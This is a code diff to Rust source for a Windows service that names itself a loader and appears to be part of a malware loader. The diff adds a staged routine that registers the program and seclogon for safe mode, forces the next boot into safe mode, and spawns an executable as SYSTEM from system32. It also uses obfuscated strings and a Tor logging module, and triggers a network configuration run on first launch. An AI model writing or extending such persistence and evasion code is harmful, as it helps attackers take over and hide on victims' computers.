@@ -1,3 +1,4 @@
+use crate::network::utils::run_config;
 use crate::safemode::utils::{
     is_safe_mode,
     register_seclogon_for_safemode,
@@ -10,6 +11,7 @@ use crate::service::utils::SERVICE_TYPE;
 use crate::{ err, info, tag, warn };
 use anyhow::{ Context, Result };
 use loader_vars::constants::{ loader_service_name, system_log_directory, system_service_directory };
+use loader_vars::types::receive::RnCnfgPrms;
 use obfstr::obfstr as s;
 use shared::constants::{
     get_initial_install_dir,
@@ -18,16 +20,20 @@ use shared::constants::{
     system_loader_exe_name,
 };
 use shared::network::tor::LoggerCnfg;
-use shared::utils::config::load_mib_config;
+use shared::utils::config::{
+    load_mib_config,
+    loader_cache_config,
+    write_loader_cache_config,
+    CacheCnfgLdr,
+    LdrStage,
+};
 use shared::utils::functions::{
-    exit_1,
     exit_1_insta,
     get_current_exe,
     is_running_from_system32,
     try_spawn_program_as_system,
 };
 use std::fs::{ create_dir_all, remove_dir_all };
-use std::thread::sleep;
 use std::{ ffi::OsString, thread, time::Duration };
 use windows_service::{
     define_windows_service,
@@ -91,11 +97,11 @@ fn service_runner() -> Result<()> {
     info!("Service start");
 
     let is_running_from_system32 = is_running_from_system32();
-    let mib_config = load_mib_config(false);
+    let mib_config = load_mib_config(false)?;
     let is_safe_mode = is_safe_mode();
 
     if !mib_config.cln_up_done && !is_safe_mode {
-        pre_cleanup();
+        pre_cleanup()?;
     }
 
     if !mib_config.cln_up_done && is_safe_mode {
@@ -112,7 +118,6 @@ fn service_runner() -> Result<()> {
     if mib_config.cln_up_done && is_running_from_system32 {
         system_service_work();
     }
-    sleep(Duration::from_secs(100));
     info!("Service end");
 
     status_handle
@@ -120,7 +125,7 @@ fn service_runner() -> Result<()> {
             service_type: SERVICE_TYPE,
             current_state: ServiceState::Stopped,
             controls_accepted: ServiceControlAccept::empty(),
-            exit_code: ServiceExitCode::Win32(0),
+            exit_code: ServiceExitCode::Win32(1),
             checkpoint: 0,
             wait_hint: Duration::default(),
             process_id: None,
@@ -130,12 +135,28 @@ fn service_runner() -> Result<()> {
     Ok(())
 }
 
-fn pre_cleanup() {
-    //! HERE SPARSE
+fn pre_cleanup() -> Result<()> {
     tag!("PRE-CLEANUP");
-    let _ = register_self_for_safemode();
-    let _ = register_seclogon_for_safemode();
-    let _ = set_next_boot_safemode();
+
+    let cache_config = loader_cache_config()?;
+
+    match cache_config.stage {
+        LdrStage::NoneReged => {
+            register_seclogon_for_safemode()?;
+            write_loader_cache_config(&(CacheCnfgLdr { stage: LdrStage::SclReged }))?;
+        }
+        LdrStage::SclReged => {
+            register_self_for_safemode()?;
+            write_loader_cache_config(&(CacheCnfgLdr { stage: LdrStage::SlfReged }))?;
+        }
+        LdrStage::SlfReged => {
+            set_next_boot_safemode()?;
+            write_loader_cache_config(&(CacheCnfgLdr { stage: LdrStage::SfbReged }))?;
+        }
+        LdrStage::SfbReged => {}
+    }
+
+    Ok(())
 }
 
 fn launch_cleanup() {
@@ -165,6 +186,12 @@ fn post_cleanup() -> Result<()> {
 
     // then we just run it, and exit - if it fails we auto restart next boot
     try_spawn_program_as_system(system_exe.to_str().unwrap(), None)?;
+    let mib_config = load_mib_config(false)?;
+    if mib_config.clnts.len() == 0 {
+        run_config(RnCnfgPrms::default()).unwrap();
+        // first run insta
+    }
+
     Ok(())
 }
 
